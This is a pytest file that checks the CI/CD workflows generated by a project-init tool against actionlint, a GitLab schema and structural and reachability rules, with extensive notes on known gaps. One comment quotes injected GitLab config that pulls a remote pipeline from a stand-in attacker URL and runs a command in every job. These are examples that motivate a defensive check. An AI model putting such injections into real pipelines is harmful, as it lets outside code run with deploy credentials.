#!/usr/bin/env python3
"""Structural validation of the CI/CD artifacts `da-tools init` SHIPS (#1347).

WHY THIS FILE EXISTS
--------------------
`scripts/tools/ops/init_project.py` generated a GitHub Actions workflow whose
``apply`` block sat at column 0 — a TOP-LEVEL workflow key instead of a job.
GitHub rejects such a file *in its entirety*, so every customer who ran the
default `da-tools init` (`--ci` defaults to ``both``, and pressing Enter in the
interactive flow picks ``both`` too) got a workflow that never ran at all. All
three ``--deploy`` variants shipped that way.

⛔ The pre-existing tests did NOT lack a parser — that is the tempting and
wrong diagnosis. ``tests/ops/test_init_project.py`` already ran
``yaml.safe_load`` over the generated workflow, and already parametrized all
nine ``--ci`` × ``--deploy`` combinations. The file was *valid YAML*, ``jobs``
*was* present, and the files *were* created — so every one of those assertions
was true while the artifact was unusable. The gap was that nothing checked the
artifact against the schema of the system that consumes it, and every other
assertion was a substring match, which is indifferent to indentation.

So: hand the artifacts to the REAL validators.

WHAT THIS GUARD BUYS
--------------------
* GitHub Actions workflows → ``actionlint`` (the same engine and the same
  ``-shellcheck= -pyflakes=`` argument pinning the repo already uses on its own
  workflows via .pre-commit-config.yaml). It rejects the #1347 shape with
  ``unexpected key "apply" for "workflow" section``.
* GitLab CI pipelines → ``check-jsonschema --builtin-schema vendor.gitlab-ci``.
* Offline structural assertions that need no binary at all, so a runner missing
  both tools still gets the #1347 class caught (top-level key set, job names,
  GitLab stage references, and which files each ``--ci`` value may emit).
* Job REACHABILITY (#1356) — that every job has at least one event under which
  its own ``if:`` and its whole transitive ``needs`` closure can all hold. No
  linter checks this; see the section-3b header for the mechanic.

WHAT THIS GUARD DOES **NOT** BUY
--------------------------------
⛔ Read this before assuming a green run means the generated pipeline works.

* **It does not prove the commands inside can run.** actionlint validates
  workflow syntax and expression semantics, not the runner's software
  inventory. The concrete live counter-example: the ``argocd`` branch emits
  ``argocd app sync …`` on a bare ``ubuntu-latest`` runner, which has no
  ``argocd`` binary — that job fails at execution time and this file stays
  green. Tracked as issue #1350.
* **It does not build the generated kustomize tree.** ``--deploy kustomize``
  scaffolds ``kustomize/`` + a README telling the user to create symlinks; the
  workflow's ``kustomize build`` step is never exercised here. Deliberately out
  of scope for this PR — tracked as issue #1349.
* **It does not verify the portal preview's YAML matches the CLI's.** The portal
  wizard's sample workflow is a SEPARATE hand-written string; this file only
  proves it is a loadable workflow with no unreachable job. On the actionlint
  axis it already passed before this file existed (all three deploy branches),
  so that leg PINS THE STATUS QUO; on the #1356 reachability axis it was
  genuinely broken and is genuinely fixed here. Divergence between the two
  generators on every other YAML axis remains issue #1351.

  ⚠️ The wizard's OTHER claim — its file tree, i.e. which files ``init`` writes
  — *is* now held to the CLI, by section 5. That assertion was absent while an
  earlier version of this bullet said the portal was unchecked in general, and
  the gap it was hiding was live: the wizard promised ``kustomize/`` and
  ``argocd/`` for ``--deploy argocd`` and ``run_init`` writes neither.
* **It does not make ``--deploy argocd`` a working deployment.** Section 5 now
  stops the wizard from *claiming* files the CLI never writes, but the product
  gap underneath is untouched and is deliberately out of scope: ``run_init``
  gates every deployment artifact on ``deploy == 'kustomize'``, so an argocd
  user gets ``conf.d/`` + CI files and nothing else — no Application manifest,
  and no ``kustomize/overlays/prod`` for one to point at (the tree
  ``docs/scenarios/gitops-ci-integration.md`` §3.3 tells them to target). The
  generated apply stage still runs ``argocd app sync dynamic-alerting``, which
  syncs an Application that was never scaffolded. Making the CLI emit it needs a
  ``repoURL`` the wizard never collects, i.e. a CLI-surface change — owner
  decision, same disposition as #1349/#1350. ``--deploy helm`` is in the same
  position (its apply reads an ``environments/prod/values.yaml`` that ``init``
  does not create).
* **It does not check that the GitLab artifact is anywhere GitLab will load
  it.** The pipeline is written to ``.gitlab-ci.d/dynamic-alerting.yml``, but
  GitLab only auto-loads a root ``.gitlab-ci.yml`` — we neither generate one
  nor tell the customer to ``include:`` ours, so on their instance the whole
  file is inert. Both validators here are handed the path directly and are
  perfectly happy: "valid pipeline" and "pipeline that runs" are different
  claims, and only the first is asserted. Issue #1357 — ⛔ deliberately NOT
  fixed in this PR.
* **It does not execute the shell inside the generated steps.** actionlint
  parses ``run:`` blocks (and could shell-check them, but that integration is
  pinned off — see the ``-shellcheck=`` note), yet nothing here observes what
  the commands DO on a runner. The concrete live counter-example is the
  ``generate`` job's "Checkout base branch config for diff" step, which carries
  TWO defects — and the ORDER matters, because fixing only the visible one
  changes nothing:

    1. ``actions/checkout@v4`` is generated with no ``fetch-depth``, so the
       runner has a depth-1 clone and the base commit object is simply absent.
       ``git show <base.sha>:conf.d`` therefore fails FIRST, short-circuiting
       the ``&&`` — so the ``git archive | tar`` half never runs at all.
    2. Had it run, it would have failed too: it untars into ``.output/base/``
       while the preceding step creates only ``.output``.

  Either way the ``||`` fallback swallows it into an empty baseline and the step
  exits 0, so every PR reports every tenant as ADDED. Issue #1358 —
  ⛔ deliberately NOT fixed in this PR.

  ⚠️ **The GitLab half is broken too, and for a THIRD reason** — an earlier
  version of this paragraph said it "relies on the same base commit being
  present and does not pin a depth either", which is true and is NOT the
  operative cause. That job runs ``git archive $CI_MERGE_REQUEST_DIFF_BASE_SHA``
  inside ``image: $DA_TOOLS_IMAGE``, and **that image has no git**:
  ``components/da-tools/app/Dockerfile`` is ``FROM python:3.13.13-alpine3.22``
  and only ever runs ``apk --no-cache upgrade`` — it never installs one.
  So the command is ``git: not found``, ``2>/dev/null || true`` swallows it, and
  ``.output/base/conf.d`` stays empty on every merge request. No fetch-depth
  change would help; the fix is a git in the image or a different way to fetch
  the baseline. Correcting this matters because the wrong cause is the sentence
  a future reader would have acted on.

  The PORTAL preview has its own, worse instance of the same class, also not
  fixed here: its "Compute blast radius" step mounts only ``conf.d`` yet passes
  ``config-diff --old-dir /data/conf.d.base``. Nothing ever creates that path
  and — unlike the CLI copy — there is no ``||`` fallback, so the step fails
  outright on a real runner. Both validators accept it because a `run:` block is
  opaque to them, which is precisely this boundary.
* **`lint-custom-rules`'s `exists: ["rule-packs/custom/"]` may never match, and
  this file now pins it.** The vendored GitLab schema describes ``exists`` as
  matching an existing **file**; a trailing-slash directory path matches no
  blob. The sibling ``changes:`` in the same rule spells the same tree as
  ``rule-packs/custom/**/*``, which suggests the directory form was meant as a
  "does this directory exist" check. If it never matches, the job is never
  created — and the failure-semantics argument written into the generator for
  that job is moot, with the dead rule now cemented by an exact pin.
  ⛔ NOT verified here: it needs a real GitLab instance, which nothing in this
  suite has. Stated rather than guessed at, and deliberately not "fixed" by
  changing the rule on a hunch — a pin over an unverified premise is the shape
  this file spent several rounds removing.
* **`CONFIG_DIR` can only ever be half-live, and that is structural.** The
  generated tool invocations honour it, but ``on.push.paths`` /
  ``on.pull_request.paths`` (GitHub) and ``rules.changes`` (GitLab) accept
  literals only — no expressions, no variables — and the base-config checkout
  also spells ``conf.d`` literally in ``git show``/``git archive``. So a customer
  who sets ``CONFIG_DIR: configs`` gets tools reading the right directory while
  the trigger filters match none of their files. The knob-reachability assertion
  above answers "is it read AT ALL", which this satisfies; it cannot answer "is
  it honoured everywhere", and no assertion here does. Renaming the config
  directory is therefore NOT supported by this generator, whatever the variable
  suggests.
* **The GitHub `apply` is gated on the EVENT, not on the ref.**
  ``workflow_dispatch`` says only that a human pressed Run; the branch is chosen
  in that dialog by anyone with write access, so the GitHub deploy remains
  dispatchable from an unmerged branch. The GitLab side is now pinned to the
  default branch, which makes the two DIFFERENT, not aligned — earlier wording
  here and in the generator claimed parity and was wrong. Closing it needs
  ``github.ref`` inside the job's ``if:``, and ``_EVENT_EQ_RE`` refuses ``&&``
  (measured: the natural fix reds 6 tests), so the evaluator has to grow first.
* **The GitLab `apply` has no dependency on validation, and this file does not
  ask for one.** The GitHub sibling is protected by ``needs: [validate]`` (see
  the #1356 reasoning below — losing that edge deploys an unvalidated config).
  The GitLab job declares no ``needs:`` at all, and stage ordering only orders
  jobs THAT EXIST: ``validate-config`` carries ``rules: - changes: [conf.d/**,
  rule-packs/**]``, so a push to the default branch touching only
  ``kustomize/overlays/prod/`` creates a pipeline whose ONLY job is ``apply`` —
  a manual production deploy of the very file just changed, with nothing having
  validated anything. The trigger-scope guard added here constrains WHO can
  press the button and from which branch; it does not give the button a
  prerequisite. Adding one is a change to the customer's deploy flow (a
  ``needs:`` on a job that may not be created fails pipeline creation outright,
  so the real fix is to make validation unconditional on the default branch)
  and is deliberately left to its own change rather than folded in here.
* **``--deploy helm`` emits a step that reads a file this generator never
  writes.** Both the GitHub and GitLab helm branches run ``helm upgrade
  --install ... -f environments/prod/values.yaml``, and no code path creates
  ``environments/``. The customer's first apply dies on ``no such file or
  directory``. Related and equally undisclosed until now: **no branch
  establishes cluster credentials at all** — there is no kubeconfig, no
  ``secrets.*`` reference, no cloud-auth action anywhere in the generated
  artifacts. Both validators pass regardless, because neither claim is about
  syntax.

BINARY ABSENCE POLICY
---------------------
Missing binary → ``skipif`` (dev hosts stay usable). But when the CI job that
INSTALLS the binary says so via ``VIBE_REQUIRE_ACTIONLINT`` /
``VIBE_REQUIRE_CHECK_JSONSCHEMA`` / ``VIBE_REQUIRE_NODE``, a missing binary is a
FAILURE — a regressed install step must not silently turn this whole file into
a green no-op. Same fail-closed pattern as ``VIBE_REQUIRE_MTAIL`` / ``_VECTOR``
/ ``_HELM`` / ``_DOCKER`` in ``.github/workflows/ci.yml`` (see
``tests/helm/test_federation_store_namespace_guard.py`` for the test-side
precedent).

⚠️ **The dev container has ``check-jsonschema`` but not ``actionlint``.** There
is no ``install-actionlint.sh`` beside ``install-promtool.sh`` /
``install-vector.sh``, and pre-commit's ``language: golang`` environment is not
on ``PATH``. So ``make dc-test`` validates the GitLab leg and silently SKIPS the
actionlint-gated tests — the leg that actually carried #1347 — with no
``VIBE_REQUIRE_*`` signal, because that flag is only set in CI. CI itself is
covered; the gap is local pre-push confidence. Installing it needs a pinned
download script plus its own parity test, so it is stated here rather than
half-done: **do not read a green ``make dc-test`` as covering the GitHub leg.**
"""
from __future__ import annotations

import ast
import itertools
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from pathlib import Path, PurePosixPath

import pytest
import yaml

_TESTS_DIR = Path(__file__).resolve().parents[1]
_REPO_ROOT = _TESTS_DIR.parent

# ⛔ Keep these as ONE literal path string each. scripts/tools/dx/verify_diff.py
# builds its source→test map by scanning test files for literal path strings; a
# `/ "scripts" / "tools"` split form registers this guard against NOTHING, so a
# change to the generator would not select it (the #1313 lesson).
_INIT_PROJECT = _REPO_ROOT / "scripts/tools/ops/init_project.py"
_PORTAL_GENERATORS = (
    _REPO_ROOT
    / "tools/portal/src/interactive/tools/cicd-setup-wizard/utils/generators.js"
)

sys.path.insert(0, str(_REPO_ROOT / "scripts" / "tools" / "ops"))
sys.path.insert(0, str(_TESTS_DIR / "ops"))

import init_project as ip  # noqa: E402
from test_init_project import CI_DEPLOY_COMBINATIONS  # noqa: E402


# ============================================================
# ── Binary discovery + fail-closed guards ──
# ============================================================

_ACTIONLINT = shutil.which("actionlint")
_CHECK_JSONSCHEMA = shutil.which("check-jsonschema")
_NODE = shutil.which("node")

_needs_actionlint = pytest.mark.skipif(
    _ACTIONLINT is None, reason="actionlint not on PATH")
_needs_check_jsonschema = pytest.mark.skipif(
    _CHECK_JSONSCHEMA is None, reason="check-jsonschema not on PATH")
_needs_node = pytest.mark.skipif(_NODE is None, reason="node not on PATH")


def test_generator_sources_exist() -> None:
    """Both generators must still be where this file says they are.

    Also keeps ``_INIT_PROJECT`` / ``_PORTAL_GENERATORS`` referenced: those two
    literal path strings are what registers this guard in
    ``scripts/tools/dx/verify_diff_map.json``, so an "unused constant" cleanup
    would quietly stop a change to either generator from selecting this test.
    """
    for p in (_INIT_PROJECT, _PORTAL_GENERATORS):
        assert p.is_file(), f"missing {p}"


def test_actionlint_present_when_required() -> None:
    """Fail-closed guard against silent disarmament of the GitHub leg."""
    if os.environ.get("VIBE_REQUIRE_ACTIONLINT") == "1":
        assert _ACTIONLINT is not None, (
            "VIBE_REQUIRE_ACTIONLINT=1 but no `actionlint` on PATH — the "
            "GitHub Actions assertions in this file would have skipped "
            "silently. Check the 'Install actionlint' step in ci.yml."
        )


def test_check_jsonschema_present_when_required() -> None:
    """Fail-closed guard against silent disarmament of the GitLab leg."""
    if os.environ.get("VIBE_REQUIRE_CHECK_JSONSCHEMA") == "1":
        assert _CHECK_JSONSCHEMA is not None, (
            "VIBE_REQUIRE_CHECK_JSONSCHEMA=1 but no `check-jsonschema` on PATH "
            "— the GitLab CI assertions in this file would have skipped "
            "silently. It is installed by this job's pip install step."
        )


def test_node_present_when_required() -> None:
    """Fail-closed guard against silent disarmament of the portal-preview leg."""
    if os.environ.get("VIBE_REQUIRE_NODE") == "1":
        assert _NODE is not None, (
            "VIBE_REQUIRE_NODE=1 but no `node` on PATH — the portal CI/CD "
            "wizard preview would never be validated."
        )


# ============================================================
# ── The combination matrix (DERIVED, with an independent floor) ──
# ============================================================

def _cli_choices(dest: str) -> tuple[str, ...]:
    """Read an argument's `choices` off the real parser.

    Derived, not transcribed: a fourth `--deploy` method becomes a validated
    combination the moment it is added to the CLI.
    """
    parser = ip._build_parser()
    for action in parser._actions:
        if action.dest == dest:
            assert action.choices, f"--{dest} has no choices to derive from"
            return tuple(action.choices)
    raise AssertionError(f"no --{dest} argument on the init_project parser")


CI_CHOICES = _cli_choices("ci")
DEPLOY_CHOICES = _cli_choices("deploy")
MATRIX = sorted(itertools.product(CI_CHOICES, DEPLOY_CHOICES))

# Which artifact each `--ci` value is allowed to emit (mirrors run_init).
_EMITS_GITHUB = {"github", "both"}
_EMITS_GITLAB = {"gitlab", "both"}

GH_COMBOS = [c for c in MATRIX if c[0] in _EMITS_GITHUB]
GL_COMBOS = [c for c in MATRIX if c[0] in _EMITS_GITLAB]

_GH_WORKFLOW = Path(".github") / "workflows" / "dynamic-alerting.yaml"
_GL_PIPELINE = Path(".gitlab-ci.d") / "dynamic-alerting.yml"


def test_matrix_matches_the_independent_hand_written_floor() -> None:
    """⛔ The anti-vacuity floor. Do not "simplify" this away.

    ``MATRIX`` is derived from the parser; ``CI_DEPLOY_COMBINATIONS`` is the
    hand-written list in ``tests/ops/test_init_project.py``. Comparing the two
    is the only reason the derivation is safe: if a ``--deploy`` choice were
    dropped from the CLI, a purely derived matrix would just parametrize fewer
    cases and every test below would still pass — pytest treats an EMPTY
    parametrize set as a skip and exits 0. Two independent sources make that
    shrinkage red instead of invisible, and make adding a fourth deploy method
    a deliberate two-file edit.

    The subset floors matter for the same reason: ``GH_COMBOS`` / ``GL_COMBOS``
    drive the binary-backed tests, so an empty subset would silently retire
    them.
    """
    assert set(MATRIX) == {tuple(c) for c in CI_DEPLOY_COMBINATIONS}, (
        f"parser-derived matrix {sorted(MATRIX)} disagrees with the hand-written "
        f"list in tests/ops/test_init_project.py "
        f"{sorted(tuple(c) for c in CI_DEPLOY_COMBINATIONS)}. Update BOTH — one "
        f"of them is the anti-vacuity floor for the other."
    )
    assert len(MATRIX) >= 9, f"only {len(MATRIX)} combinations — matrix collapsed"
    assert len(GH_COMBOS) >= 6, f"only {len(GH_COMBOS)} GitHub-emitting combinations"
    assert len(GL_COMBOS) >= 6, f"only {len(GL_COMBOS)} GitLab-emitting combinations"


# ============================================================
# ── Generation: the REAL writer, once per combination ──
# ============================================================

@pytest.fixture(scope="module")
def generated(tmp_path_factory) -> dict[tuple[str, str], Path]:
    """Run ``run_init`` (the real write path) once per combination.

    ⛔ Deliberately NOT calling ``_gen_github_actions`` / ``_gen_gitlab_ci``
    directly: half the contract under test is *which files get written where*.
    A dispatch bug that emits a GitLab pipeline under ``--ci github`` is
    invisible to a generator-level test and caught here.
    """
    out: dict[tuple[str, str], Path] = {}
    for ci, deploy in MATRIX:
        target = tmp_path_factory.mktemp(f"init-{ci}-{deploy}")
        ip.run_init(
            {
                "ci": ci,
                "deploy": deploy,
                "rule_packs": ["mariadb"],
                "tenants": ["db-a"],
                "namespace": "monitoring",
                "da_tools_image": "ghcr.io/vencil/da-tools:latest",
            },
            str(target),
        )
        out[(ci, deploy)] = target
    return out


def _run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd, capture_output=True, text=True, encoding="utf-8",
        errors="replace", timeout=180,
    )


# ============================================================
# ── 1. GitHub Actions: the real linter ──
# ============================================================

@_needs_actionlint
@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_generated_github_workflow_passes_actionlint(generated, ci, deploy) -> None:
    """The artifact must satisfy the schema of the system that consumes it.

    ``-shellcheck=`` / ``-pyflakes=`` are pinned OFF for the same reason
    .pre-commit-config.yaml pins them off: those optional integrations run
    "if installed", so leaving them implicit produces different findings on a
    Windows dev host than on an ubuntu runner.
    """
    path = generated[(ci, deploy)] / _GH_WORKFLOW
    proc = _run([_ACTIONLINT, "-shellcheck=", "-pyflakes=", str(path)])
    assert proc.returncode == 0, (
        f"actionlint rejected the workflow generated by "
        f"`da-tools init --ci {ci} --deploy {deploy}` — GitHub would refuse to "
        f"load it:\n{proc.stdout}\n{proc.stderr}"
    )


# ============================================================
# ── 2. GitLab CI: the real schema validator ──
# ============================================================

@_needs_check_jsonschema
@pytest.mark.parametrize("ci,deploy", GL_COMBOS)
def test_generated_gitlab_pipeline_passes_schema(generated, ci, deploy) -> None:
    """``--regex-variant nonunicode`` matches GitLab's own RE2 flavour; the
    ``gitlab-ci`` data transform resolves the ``!reference`` tags the vendored
    schema expects."""
    path = generated[(ci, deploy)] / _GL_PIPELINE
    proc = _run([
        _CHECK_JSONSCHEMA,
        "--builtin-schema", "vendor.gitlab-ci",
        "--data-transform", "gitlab-ci",
        "--regex-variant", "nonunicode",
        str(path),
    ])
    assert proc.returncode == 0, (
        f"check-jsonschema rejected the pipeline generated by "
        f"`da-tools init --ci {ci} --deploy {deploy}`:\n"
        f"{proc.stdout}\n{proc.stderr}"
    )


# ============================================================
# ── 3. Offline structure (no binary required) ──
# ============================================================

# ⚠️ PyYAML implements YAML 1.1, where the bare key `on:` is a BOOLEAN, so the
# workflow's trigger block parses as the Python key `True`, not `"on"`. That is
# correct behaviour for a 1.1 parser and GitHub (YAML 1.2) reads the same file
# as `"on"` — so this is asserted as-is rather than "fixed" by quoting the key
# in the generator or post-processing the parse result.
_EXPECTED_GH_TOP_LEVEL = {"name", True, "env", "jobs", "permissions"}
_EXPECTED_GH_JOBS = {"validate", "generate", "apply"}

# GitLab top-level keywords that are configuration, not jobs.
# https://docs.gitlab.com/ee/ci/yaml/#keywords
#
# This IS an enumeration, which is normally the wrong shape for a guard — so
# note which way each error falls. Too WIDE (a job name accidentally listed
# here) would silently shrink the job set, which the exact `set(jobs) ==
# _EXPECTED_GL_JOBS` assertion below catches. (This used to point at a
# `len(jobs) >= 4` floor; the equality replaced it and the reference went
# stale — the protection moved, it did not disappear.)
#
# ⛔ Too NARROW used to be the unsafe direction, and the comment here claimed
# otherwise. It said a missing global keyword "misreads config as a job and
# fails loudly on the `stage` assertion" — true only for the ones that are
# mappings. SIX of these ten are lists or scalars (`stages`, `include`,
# `before_script`, `after_script`, `services`, and `image` in its scalar form),
# and the job filter dropped every non-dict, so a missing entry of that shape
# vanished silently instead. `_gitlab_jobs()` now asserts that every non-dict
# top-level key is one this set knows about, which makes the claim true rather
# than merely asserting it.
_GITLAB_GLOBAL_KEYWORDS = {
    "stages", "variables", "include", "default", "workflow",
    "image", "services", "before_script", "after_script", "cache",
}


def _gitlab_jobs(pipeline: dict) -> dict:
    """Job name -> body, with the unrecognised-keyword case made LOUD."""
    unknown_non_jobs = sorted(
        name for name, body in pipeline.items()
        if not isinstance(body, dict)
        and name not in _GITLAB_GLOBAL_KEYWORDS
        and not str(name).startswith(".")
    )
    assert not unknown_non_jobs, (
        f"top-level key(s) {unknown_non_jobs} are not mappings and are not in "
        "_GITLAB_GLOBAL_KEYWORDS. Either the generator grew a global keyword "
        "this set does not know about — add it — or it emitted a malformed "
        "job. Do NOT drop this: a non-dict key that is silently ignored is a "
        "job that quietly leaves every assertion below."
    )
    return {
        name: body for name, body in pipeline.items()
        if name not in _GITLAB_GLOBAL_KEYWORDS
        and not str(name).startswith(".")
        and isinstance(body, dict)
    }


# GitLab `rules:` keys that make an entry CONDITIONAL. An entry carrying none of
# them matches every pipeline — that is the rule, and it is why this is a
# derivation rather than a list of forbidden spellings.
_GITLAB_RULE_CONDITIONS = {"if", "changes", "exists"}

# WHOLE `if:` expressions a production-deploy rule entry may carry. Equality,
# not substring: `!=`, `||` and every other meaning-changing edit still contains
# the variable name, so a presence test grades the wrong thing entirely.
_GITLAB_DEPLOY_CONDITIONS = {
    "$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH",
}

# The generated GitLab pipeline's job set, pinned exactly (see the reasoning at
# the assertion — a new job is not covered by anything here by default).
_EXPECTED_GL_JOBS = {
    "validate-config", "lint-custom-rules", "generate-routes", "apply",
}

# ⛔ The NON-deploy jobs' gates, pinned exactly. The deploy-trigger guard selects
# on `environment:`, so the three validation jobs were graded by nothing but
# "does the job still exist" — and their gate is where the damage is quiet:
# measured, pointing `validate-config`'s `changes:` at a path that matches
# nothing left 277 passed, and `when: never` left 83 passed, while the
# customer's only config-validation job stopped firing on every pipeline and
# `apply` stayed a live manual production deploy. The boundary paragraph in this
# file's header also argues FROM these rules, so leaving them unpinned made a
# stated boundary rest on an unenforced fact.
# ⛔ Top-level key set, exactly — the GitLab counterpart of the #1347 detector
# the GitHub leg already had. `_gitlab_jobs()` FILTERS the ten global keywords
# out before anything grades them, so an injected global was invisible by
# construction. Measured, both 95 passed and both accepted by check-jsonschema:
#   include: - remote: 'https://attacker.example/p.yml'   → third-party CI config
#                                                           pulled into a pipeline
#                                                           holding cluster-write
#                                                           credentials
#   default: before_script: [echo pwned]                  → a command injected into
#                                                           EVERY job, apply included
_EXPECTED_GL_TOP_LEVEL = {
    "stages", "variables",
    "validate-config", "lint-custom-rules", "generate-routes", "apply",
}

# job -> the stage it must run in. `stages:` order was pinned; each job's own
# `stage:` value was only checked for MEMBERSHIP, so moving `apply` to
# `stage: validate` left 95 passed and put the `environment: production` play
# button in stage 1 — the exact state the stages-order message says it prevents.
# Order and assignment are two halves of one contract; pinning one is pinning
# neither.
_EXPECTED_GL_JOB_STAGES = {
    "validate-config": "validate",
    "lint-custom-rules": "validate",
    "generate-routes": "generate",
    "apply": "apply",
}

_EXPECTED_GL_JOB_RULES = {
    "validate-config": [{"changes": ["conf.d/**/*", "rule-packs/**/*"]}],
    "lint-custom-rules": [
        {"changes": ["rule-packs/custom/**/*"], "exists": ["rule-packs/custom/"]}
    ],
    "generate-routes": [
        {"if": '$CI_PIPELINE_SOURCE == "merge_request_event"',
         "changes": ["conf.d/**/*"]}
    ],
}


@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_github_workflow_top_level_shape(generated, ci, deploy) -> None:
    """⛔ EXACT sets, top-level AND jobs — the #1347 detector that needs no binary.

    Both assertions below are ``==``, and that is the whole point. A subset
    check (``'jobs' in workflow``) is what the pre-existing test did, and it
    stayed green while ``apply`` was a stray top-level key.

    Measured, not assumed: weakening BOTH equalities to subset relations and
    re-introducing the #1347 bug turns this test green again while actionlint
    still fails — so the equality form, not the parse, is what the offline leg
    buys. The two cover different halves and neither is redundant: the jobs-set
    equality catches a job that went MISSING, the top-level equality catches
    whatever it went missing INTO (and names it in the failure message).
    """
    path = generated[(ci, deploy)] / _GH_WORKFLOW
    workflow = yaml.safe_load(path.read_text(encoding="utf-8"))

    assert set(workflow) == _EXPECTED_GH_TOP_LEVEL, (
        f"unexpected top-level keys in the workflow generated by "
        f"`--ci {ci} --deploy {deploy}`: got {sorted(map(str, workflow))}, "
        f"expected {sorted(map(str, _EXPECTED_GH_TOP_LEVEL))}. An extra key is "
        f"almost always a job block that lost its indentation (#1347); GitHub "
        f"rejects the ENTIRE file when that happens."
    )
    assert set(workflow["jobs"]) == _EXPECTED_GH_JOBS, (
        f"job set drifted for `--ci {ci} --deploy {deploy}`: "
        f"{sorted(workflow['jobs'])}"
    )
    for name, job in workflow["jobs"].items():
        assert isinstance(job, dict) and "steps" in job, (
            f"job {name!r} has no steps — it did not parse as a job body"
        )


# ============================================================
# ── 3b. Job reachability: does every job have an event? (#1356) ──
# ============================================================
#
# GitHub Actions, "Using jobs in a workflow" / `jobs.<job_id>.needs`:
#
#   "If a job fails or is SKIPPED, all jobs that need it are skipped unless
#    the jobs use a conditional expression that causes the job to continue."
#
# So a job's `needs` is not just an ordering constraint — it is a *skip
# channel*. `apply` shipped with `needs: [validate, generate]` + `if:
# github.event_name == 'workflow_dispatch'`, while `generate` carried `if:
# github.event_name == 'pull_request'`. On a workflow_dispatch run `generate`
# is skipped, and `apply` was skipped with it; on a pull_request run `apply`'s
# own `if` is false. Zero reachable events — the deploy stage could never run,
# and nothing was red.
#
# This repo already records the same mechanic from the other direction:
# .github/workflows/ci.yml, the `Python Tests (3.13)` aggregation gate, whose
# `always():` comment says "without it a failed/skipped dependency SKIPS this
# job" (grep that sentence — a line number here goes stale on the next edit of
# a 1700-line workflow, and it already had). `if: always()` is precisely
# the "conditional expression that causes the job to continue" escape hatch
# named in the quote above.
#
# ⛔ The evaluator below is deliberately TINY and deliberately fail-closed.
# It understands one expression shape, and any other shape is an ERROR rather
# than an assumption. Guessing "probably reachable" is the unsafe direction:
# the test would go green while the job never runs — which is the exact defect
# class this section exists to catch.

_EVENT_EQ_RE = re.compile(
    r"""^\s*(?:\$\{\{)?\s*github\.event_name\s*==\s*'([A-Za-z0-9_]+)'\s*(?:\}\})?\s*$"""
)


class _UnsupportedIf(AssertionError):
    """Raised for an `if:` this evaluator has not been taught to read."""


def _workflow_events(workflow: dict, label: str) -> tuple[str, ...]:
    """The event names in the workflow's `on:` block — derived, never hard-coded.

    ⚠️ PyYAML is a YAML 1.1 parser, so the bare key ``on:`` arrives as the
    Python boolean ``True`` (see the note above ``_EXPECTED_GH_TOP_LEVEL``).
    Accept either spelling rather than assuming one.
    """
    trigger = workflow.get(True, workflow.get("on"))
    if isinstance(trigger, dict):
        events = tuple(str(k) for k in trigger)
    elif isinstance(trigger, list):
        events = tuple(str(k) for k in trigger)
    elif isinstance(trigger, str):
        events = (trigger,)
    else:
        raise AssertionError(
            f"{label}: cannot read the `on:` block (got {trigger!r}). Without "
            f"an event set this whole reachability check would be vacuous."
        )
    assert events, f"{label}: the workflow declares no triggering events"
    return events


def _if_holds(expr, event: str, label: str) -> bool:
    """Evaluate a job-level ``if:`` for one event name.

    Supported: absent/empty (always true), and ``github.event_name == '<x>'``
    with or without a ``${{ }}`` wrapper. That is the only shape either
    generator emits today.

    ⛔ Anything else raises. Do NOT add a "treat unknown as true" fallback —
    an unrecognised condition that is really false would make an unreachable
    job look reachable, i.e. this file green and the customer's deploy stage
    dead. Teaching the evaluator a new shape is the correct response.
    """
    if expr is None:
        return True
    if not isinstance(expr, str) or not expr.strip():
        raise _UnsupportedIf(
            f"{label}: non-string `if:` {expr!r} — the reachability evaluator "
            f"needs extending before this workflow can be judged."
        )
    m = _EVENT_EQ_RE.match(expr)
    if not m:
        raise _UnsupportedIf(
            f"{label}: `if: {expr}` is a shape the reachability evaluator does "
            f"not understand. It only reads `github.event_name == '<event>'`. "
            f"⛔ Extend the evaluator (and its counter-example test) — do not "
            f"relax it to assume the job runs, which is how #1356 would hide."
        )
    return m.group(1) == event


def _needs_of(job: dict) -> tuple[str, ...]:
    needs = job.get("needs")
    if needs is None:
        return ()
    if isinstance(needs, str):
        return (needs,)
    return tuple(str(n) for n in needs)


def _runs_under(name: str, event: str, jobs: dict, label: str,
                stack: tuple[str, ...] = ()) -> bool:
    """Would job ``name`` execute on a run triggered by ``event``?

    True iff its own ``if:`` holds AND every job in its transitive ``needs``
    closure also runs — because a skipped dependency skips its dependants.
    """
    assert name not in stack, (
        f"{label}: `needs` cycle {' -> '.join(stack + (name,))}"
    )
    job = jobs.get(name)
    assert isinstance(job, dict), (
        f"{label}: job {name!r} is referenced by `needs` but is not a job in "
        f"this workflow"
    )
    if not _if_holds(job.get("if"), event, f"{label}/{name}"):
        return False
    return all(
        _runs_under(dep, event, jobs, label, stack + (name,))
        for dep in _needs_of(job)
    )


# ⛔ The CONTRACT, both directions. An earlier draft asserted only that no job
# was dead — which measures exactly one half of "is this job gated correctly".
# Adversarial review deleted all three `apply` gates (making `kubectl apply -f`
# / `helm upgrade --install` / `argocd app sync --prune`, every one of them
# under `environment: production`, run on EVERY pull_request and every push to
# main) and the whole suite stayed green at 222 passed — because a WIDER
# reachable set contains no dead job. The blast radius of that direction is far
# larger than #1356's, so the map is pinned exactly rather than floor-checked.
# ⛔ The GitHub trigger's FILTERS, pinned like the GitLab `rules:` are. Event
# names alone were the only thing checked, and a filter is where the damage is
# quiet: measured, rewriting the generated `on:` to
# `pull_request: {paths: ['this-path-does-not-exist/**']}` plus
# `push: {branches: [no-such-branch]}` left 95 passed and zero red, while
# `validate` and `generate` stopped firing on every PR and push — and `apply`
# (environment: production) stayed a live manual deploy. Exactly the asymmetry
# this file names as its most productive defect shape, left on the leg that
# produced #1347.
# The two legs legitimately differ (the preview is a simplified sample), so this
# is passed per-leg rather than shared — but BOTH are pinned, which is the point.
_CLI_GH_TRIGGERS = {
    "pull_request": {"paths": ["conf.d/**", "kustomize/**", "rule-packs/**"]},
    # ⛔ NO `branches:` key. `on.push.branches` takes literals only, so any
    # value there is a guess at the customer's default branch — `main` is
    # simply wrong for a `master`/`trunk` repo, and that leg then never
    # fires. Pinning the ABSENCE is the contract: it says "we deliberately
    # do not guess", where pinning `["main"]` would have cemented the bug
    # and made the eventual fix red a test.
    "push": {"paths": ["conf.d/**"]},
    "workflow_dispatch": None,
}
